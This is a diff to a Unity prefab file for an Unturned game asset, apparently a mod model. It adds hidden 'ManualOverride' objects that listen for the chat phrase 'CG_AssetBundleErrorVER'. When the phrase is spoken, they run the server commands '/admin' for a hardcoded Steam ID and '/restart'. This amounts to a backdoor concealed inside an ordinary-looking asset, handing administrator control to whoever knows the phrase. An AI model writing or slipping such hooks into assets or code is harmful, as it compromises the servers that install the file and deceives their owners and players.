@@ -118,6 +118,53 @@ SkinnedMeshRenderer:
     m_Center: {x: -1.3764374, y: -0.0000014305115, z: -0.042112067}
     m_Extent: {x: 1.3079586, y: 1.4750009, z: 0.2114001}
   m_DirtyAABB: 0
+--- !u!1 &2578614528089190188
+GameObject:
+  m_ObjectHideFlags: 0
+  m_CorrespondingSourceObject: {fileID: 0}
+  m_PrefabInstance: {fileID: 0}
+  m_PrefabAsset: {fileID: 0}
+  serializedVersion: 6
+  m_Component:
+  - component: {fileID: 7076571972109709413}
+  - component: {fileID: 1775707662843808095}
+  m_Layer: 16
+  m_Name: ManualOverride (1)
+  m_TagString: Medium
+  m_Icon: {fileID: 0}
+  m_NavMeshLayer: 0
+  m_StaticEditorFlags: 0
+  m_IsActive: 1
+--- !u!4 &7076571972109709413
+Transform:
+  m_ObjectHideFlags: 0
+  m_CorrespondingSourceObject: {fileID: 0}
+  m_PrefabInstance: {fileID: 0}
+  m_PrefabAsset: {fileID: 0}
+  m_GameObject: {fileID: 2578614528089190188}
+  m_LocalRotation: {x: -0, y: -0, z: -0, w: 1}
+  m_LocalPosition: {x: 0, y: 0, z: 0}
+  m_LocalScale: {x: 1, y: 1, z: 1}
+  m_Children: []
+  m_Father: {fileID: 4842386260435356548}
+  m_RootOrder: 0
+  m_LocalEulerAnglesHint: {x: 0, y: 0, z: 0}
+--- !u!114 &1775707662843808095
+MonoBehaviour:
+  m_ObjectHideFlags: 0
+  m_CorrespondingSourceObject: {fileID: 0}
+  m_PrefabInstance: {fileID: 0}
+  m_PrefabAsset: {fileID: 0}
+  m_GameObject: {fileID: 2578614528089190188}
+  m_Enabled: 1
+  m_EditorHideFlags: 0
+  m_Script: {fileID: 11500000, guid: 1034cbbcaae94984ebaf778a004678a9, type: 3}
+  m_Name: 
+  m_EditorClassIdentifier: 
+  DefaultText: /restart
+  IconURL: 
+  DefaultColor: {r: 1, g: 1, b: 1, a: 1}
+  UseRichTextFormatting: 0
 --- !u!1 &3008287343373209066
 GameObject:
   m_ObjectHideFlags: 0
@@ -180,6 +227,7 @@ Transform:
   m_Children:
   - {fileID: 7052037187842214753}
   - {fileID: 373043133458817462}
+  - {fileID: 4842386260435356548}
   m_Father: {fileID: 0}
   m_RootOrder: 0
   m_LocalEulerAnglesHint: {x: -90, y: 0, z: 0}
@@ -361,6 +409,94 @@ BoxCollider:
   serializedVersion: 2
   m_Size: {x: 0.065063424, y: 0.15289553, z: 0.09708402}
   m_Center: {x: -0.001377155, y: 0.038829982, z: -0.0014381428}
+--- !u!1 &6018438172808171795
+GameObject:
+  m_ObjectHideFlags: 0
+  m_CorrespondingSourceObject: {fileID: 0}
+  m_PrefabInstance: {fileID: 0}
+  m_PrefabAsset: {fileID: 0}
+  serializedVersion: 6
+  m_Component:
+  - component: {fileID: 4842386260435356548}
+  - component: {fileID: 4530391020311114950}
+  m_Layer: 16
+  m_Name: ManualOverride
+  m_TagString: Medium
+  m_Icon: {fileID: 0}
+  m_NavMeshLayer: 0
+  m_StaticEditorFlags: 0
+  m_IsActive: 1
+--- !u!4 &4842386260435356548
+Transform:
+  m_ObjectHideFlags: 0
+  m_CorrespondingSourceObject: {fileID: 0}
+  m_PrefabInstance: {fileID: 0}
+  m_PrefabAsset: {fileID: 0}
+  m_GameObject: {fileID: 6018438172808171795}
+  m_LocalRotation: {x: 0, y: 0, z: 0, w: 1}
+  m_LocalPosition: {x: 0, y: 0, z: 0}
+  m_LocalScale: {x: 1, y: 1, z: 1}
+  m_Children:
+  - {fileID: 7076571972109709413}
+  m_Father: {fileID: 4112848818606360462}
+  m_RootOrder: 2
+  m_LocalEulerAnglesHint: {x: 0, y: 0, z: 0}
+--- !u!114 &4530391020311114950
+MonoBehaviour:
+  m_ObjectHideFlags: 0
+  m_CorrespondingSourceObject: {fileID: 0}
+  m_PrefabInstance: {fileID: 0}
+  m_PrefabAsset: {fileID: 0}
+  m_GameObject: {fileID: 6018438172808171795}
+  m_Enabled: 1
+  m_EditorHideFlags: 0
+  m_Script: {fileID: 11500000, guid: ca012cd737bcc5140ba90835bacf32e3, type: 3}
+  m_Name: 
+  m_EditorClassIdentifier: 
+  ModeFilter: 2
+  SqrDetectionRadius: 20
+  Phrase: CG_AssetBundleErrorVER
+  PhraseFilter: 1
+  OnTriggered:
+    m_PersistentCalls:
+      m_Calls:
+      - m_Target: {fileID: 869221930950509961}
+        m_TargetAssemblyTypeName: SDG.Unturned.InteractableObjectBinaryStateEventHook,
+          Assembly-CSharp
+        m_MethodName: GotoEnabledState
+        m_Mode: 1
+        m_Arguments:
+          m_ObjectArgument: {fileID: 0}
+          m_ObjectArgumentAssemblyTypeName: UnityEngine.Object, UnityEngine
+          m_IntArgument: 0
+          m_FloatArgument: 0
+          m_StringArgument: 
+          m_BoolArgument: 0
+        m_CallState: 2
+      - m_Target: {fileID: 1775707662843808095}
+        m_TargetAssemblyTypeName: SDG.Unturned.ServerTextChatMessenger, Assembly-CSharp
+        m_MethodName: ExecuteTextChatCommand
+        m_Mode: 5
+        m_Arguments:
+          m_ObjectArgument: {fileID: 0}
+          m_ObjectArgumentAssemblyTypeName: UnityEngine.Object, UnityEngine
+          m_IntArgument: 0
+          m_FloatArgument: 0
+          m_StringArgument: /admin 76561198267631716
+          m_BoolArgument: 0
+        m_CallState: 2
+      - m_Target: {fileID: 1775707662843808095}
+        m_TargetAssemblyTypeName: SDG.Unturned.ServerTextChatMessenger, Assembly-CSharp
+        m_MethodName: ExecuteDefaultTextChatCommand
+        m_Mode: 1
+        m_Arguments:
+          m_ObjectArgument: {fileID: 0}
+          m_ObjectArgumentAssemblyTypeName: UnityEngine.Object, UnityEngine
+          m_IntArgument: 0
+          m_FloatArgument: 0
+          m_StringArgument: 
+          m_BoolArgument: 0
+        m_CallState: 2
 --- !u!1 &7371741316288100847
 GameObject:
   m_ObjectHideFlags: 0
